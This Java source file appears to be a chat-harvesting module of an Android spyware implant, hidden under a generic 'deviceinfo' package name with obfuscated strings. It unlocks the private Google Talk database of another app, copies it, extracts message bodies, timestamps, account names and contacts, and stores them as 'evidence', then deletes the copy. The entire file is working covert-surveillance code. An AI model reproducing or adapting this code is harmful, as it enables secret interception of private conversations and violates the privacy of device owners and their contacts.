package com.android.deviceinfo.module.chat;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.concurrent.Semaphore;

import android.database.Cursor;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.db.GenericSqliteHelper;
import com.android.deviceinfo.db.RecordVisitor;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.manager.ManagerModule;
import com.android.deviceinfo.module.ModuleAddressBook;
import com.android.deviceinfo.util.Check;
import com.android.m.M;

public class ChatGoogle extends SubModuleChat {

	private static final String TAG = "ChatGoogle";

	private static final int PROGRAM = 0x04;

	String pObserving = M.e("com.google.android.talk");

	Semaphore readChatSemaphore = new Semaphore(1, true);

	private Long lastLine;

	@Override
	int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification stop)");
		}
		readChatMessages();
	}
	
	/**
	 * Estrae dal file RegisterPhone.xml il numero di telefono
	 * 
	 * @return
	 */
	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}
		readChatMessages();
	}



	private void readChatMessages() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages), semaphore red");
			}

			return;
		}

		try {
			boolean updateMarkup = false;

			String dbFile = M.e("talk.db");
			String dbDir = M.e("/data/data/com.google.android.gsf/databases");

			lastLine = markup.unserialize(new Long(0));

			if (Path.unprotect(dbDir, dbFile, true)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): can read DB");
				}

				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
				helper.deleteAtEnd = false;

				setMyAccount(helper);
				//ChatGroups groups = getChatGroups(helper);

				// Save contacts if AddressBook is active
				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
					saveContacts(helper);
				}

				long newLastLine = fetchMessages(helper, lastLine);

				helper.deleteDb();

				if (newLastLine > lastLine) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readChatMessages): updating markup");
					}
					try {
						markup.writeMarkupSerializable(new Long(newLastLine));
					} catch (IOException e) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (readChatWeChatMessages) Error: " + e);
						}
					}
				}

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
				}
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatWeChatMessages) Error: ", ex);
			}
		} finally {

			readChatSemaphore.release();
		}
	}

	private long fetchMessages(GenericSqliteHelper helper, long lastLine) {
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

		String sqlquery = M.e("select m.date, ac.name, m.type, body, co.username, co.nickname from messages as m join  contacts as co on m.thread_id = co._id join accounts as ac on co.account = ac._id where m.consolidation_key is null and m.type<=1 and m.date>?");
				RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				long createTime = cursor.getLong(0);
				Date date = new Date(createTime);
				String account = cursor.getString(1);
				int isSend = cursor.getInt(2);
				boolean incoming = isSend == 1;
				String content = cursor.getString(3);
				String co_username = cursor.getString(4);
				String co_nick = cursor.getString(5);


				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) %s] %s %s %s: %s ", date, account,(incoming ? "<-"
							: "->"), co_nick, content );
				}
				String from_id, from_display, to_id, to_display;
				
				
				if(co_nick==null || co_nick.startsWith(M.e("private-chat"))){
					return 0;
				}
				
				if(incoming){
					from_id = co_username;
					from_display = co_nick;
					to_id = account;
					to_display = account;
				}else{
					from_id = account;
					from_display = account;
					to_id = co_username;
					to_display = co_nick;
				}
				

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) %s -> %s", from_id, to_id);
				}
				MessageChat message = new MessageChat(PROGRAM, date, from_id, from_display, to_id, to_display, content, incoming);
				messages.add(message);

				return createTime;
			}
		};
		long lastCreationLine = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastLine) }, visitor);

		getModule().saveEvidence(messages);

		return lastCreationLine;
	}

	private void setMyAccount(GenericSqliteHelper helper) {
		String[] projection = new String[]{"_id","name","username"};
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				int id = cursor.getInt(0);
				String name = cursor.getString(1);
				String username = cursor.getString(2);
				
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setMyAccount) %s, %s", name, username);
				}

				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, name);
				
				return id;
			}
		};

		long ret = helper.traverseRecords("accounts", visitor);
		
	}

	private void saveContacts(GenericSqliteHelper helper) {
		String[] projection = new String[] { "username", "nickname" };
	
		boolean tosave = false;
		RecordVisitor visitor = new RecordVisitor(projection, "nickname not null ") {
	
			@Override
			public long cursor(Cursor cursor) {
	
				String username = cursor.getString(0);
				String nick = cursor.getString(1);
	
				Contact c = new Contact(username, username, nick, "");
				if (username != null && !username.endsWith(M.e("public.talk.google.com"))) {
					if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.GOOGLE, c)) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (cursor) need to serialize");
						}
						return 1;
					}
				}
				return 0;
			}
		};
	
		if (helper.traverseRecords(M.e("contacts"), visitor) == 1) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveContacts) serialize");
			}
			ModuleAddressBook.getInstance().serializeContacts();
		}
	}
}
